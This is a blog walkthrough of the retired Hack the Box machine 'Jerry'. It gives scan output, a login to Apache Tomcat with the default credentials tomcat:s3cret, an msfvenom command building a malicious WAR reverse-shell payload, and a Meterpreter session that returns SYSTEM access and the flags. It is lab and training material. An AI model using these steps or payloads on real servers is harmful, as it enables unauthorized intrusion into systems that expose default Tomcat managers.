---
layout: post
title:  "Hack the Box - Jerry"
date:   2018-07-30 23:23:00
categories: [walkthrough, htb]
comments: false
---
![HTB-jerry](/img/htb/jerry.png)

An easy box by mrh4sh.  Really simple box in the same venue as Lame, Blue, Grandma/Grandpa.  Great for those starting out to attempt.

{% highlight bash %}
meterpreter > sysinfo
Computer    : JERRY
OS          : Windows Server 2012 R2 6.3 (amd64)
Meterpreter : java/windows
meterpreter > getuid
Server username: JERRY$
meterpreter >
{% endhighlight %}

<!--more-->

## Discovery/Enumeration

Recently I discovered a pretty cool tool for discovery called `RECONNOITRE`.  I had been using Sparta in the past but I really liked how this one ran in the command line and saved its findings automatically.  

{% highlight bash %}
┌[ ~/hackthebox/boxes/retired ] [master !?]
└─> root@kali # reconnoitre -t  10.10.10.95 --services -o `pwd`
  __
|\"\"\"\-=  RECONNOITRE
(____)      An OSCP scanner by @codingo_

[+] Testing for required utilities on your system.
[#] Performing service scans
[*] Loaded single target: 10.10.10.95
[+] Creating directory structure for 10.10.10.95
   [>] Creating scans directory at: /root/hackthebox/boxes/retired/10.10.10.95/scans
   [>] Creating exploit directory at: /root/hackthebox/boxes/retired/10.10.10.95/exploit
   [>] Creating loot directory at: /root/hackthebox/boxes/retired/10.10.10.95/loot
   [>] Creating proof file at: /root/hackthebox/boxes/retired/10.10.10.95/proof.txt
[+] Starting quick nmap scan for 10.10.10.95
[+] Writing findings for 10.10.10.95
[*] Found HTTP/S service on 10.10.10.95:8080
[*] Found HTTP service on 10.10.10.95:8080
[*] TCP quick scans completed for 10.10.10.95
[+] Starting detailed TCP/UDP nmap scans for 10.10.10.95

{% endhighlight %}

Right away it found a web server running on TCP/8080, it also provides a couple of decent tips for how to procede in enumeration.  Note that sometimes the commands have syntax errors in them, probably something that is fixable...

{% highlight bash %}
[*] Found HTTP/S service on 10.10.10.95:8080
   [*] Enumeration
      [=] nikto -h 10.10.10.95 -p 8080 -output /root/hackthebox/boxes/retired/10.10.10.95/scans/10.10.10.95_8080_nikto.txt
      [=] curl -i 10.10.10.95:8080
      [=] w3m -dump 10.10.10.95/robots.txt | tee /root/hackthebox/boxes/retired/10.10.10.95/scans/10.10.10.95_8080_robots.txt
      [=] VHostScan -t 10.10.10.95 -oN /root/hackthebox/boxes/retired/10.10.10.95/scans/10.10.10.95_8080_vhosts.txt

[*] Found HTTP service on 10.10.10.95:8080
   [*] Enumeration
      [=] dirb http://10.10.10.95:8080/ -o /root/hackthebox/boxes/retired/10.10.10.95/scans/10.10.10.95_8080_dirb.txt
      [=] dirbuster -H -u http://10.10.10.95:8080/ -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -s / -v -r /root/hackthebox/boxes/retired/10.10.10.95/scans/10.10.10.95_8080_dirbuster_medium.txt
      [=] gobuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.95:8080/ -s '200,204,301,302,307,403,500' -e | tee '/root/hackthebox/boxes/retired/10.10.10.95/scans/10.10.10.95_8080_gobuster_common.txt'
      [=] gobuster -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u http://10.10.10.95:8080/ -s '200,204,301,307,403,500' -e | tee '/root/hackthebox/boxes/retired/10.10.10.95/scans/10.10.10.95_8080_gobuster_cgis.txt'

[*] Always remember to manually go over the portscan report and carefully read between the lines ;)
{% endhighlight %}

Browsing to http://10.10.10.95:8080/ we are greeted by Apache Tomcat, oh how I like Tomcat.  

![HTB-jerry](/img/htb/jerry/tcp8080.png)

By default old version of tomcat use `tomcat:s3cret` to authenticate.  There are a couple other defaults out there as well depending on the versions.  lets try those and see if that gives us access.

![HTB-jerry](/img/htb/jerry/tomcat-login.png)

## Exploitation

Awesome, and we have the opportunity to upload our own WAR file.  This should make for an easy shell.  To create the malicious payload we can use msfvenom:

{% highlight bash %}
┌[ ~/hackthebox/www ] [master !?]
└─> root@kali # msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=443 -f war > 10.10.14.17.mrtcp443.war
Payload size: 1083 bytes
Final size of war file: 1083 bytes


┌[ ~/hackthebox/www ] [master !?]
└─> root@kali #
{% endhighlight %}

I try to give my payloads a rather descriptive name for these CTF's in the event I need to rebuild or reuse one.   Scroll down to `WAR file to deploy` and upload the output of msfvenom.

![HTB-jerry](/img/htb/jerry/tomcat-backdoord.png)

And prepare a multi/handler to catch the session in Metasploit.  If you are trying to keep it Metasploit-free a netcat session would work here as well using the java/jsp_shell_reverse_tcp payload instead.  Click on the link for the name to get your shell.

{% highlight bash %}
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.17:443
[*] Sending stage (53906 bytes) to 10.10.10.95
[*] Meterpreter session 2 opened (10.10.14.17:443 -> 10.10.10.95:49194) at 2020-02-06 15:28:59 -0700

meterpreter > sysinfo
Computer    : JERRY
OS          : Windows Server 2012 R2 6.3 (amd64)
Meterpreter : java/windows
meterpreter > getuid
Server username: JERRY$
meterpreter >
{% endhighlight %}

Oh nice, immediatly system, no privesc for us.

## Loot!

{% highlight bash %}
meterpreter > shell
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>cd C:\Users\Administrator\Desktop\flags
C:\Users\Administrator\Desktop\flags>type *
user.txt
700**************************d00

root.txt
04a**************************90e
C:\Users\Administrator\Desktop\flags>
{% endhighlight %}
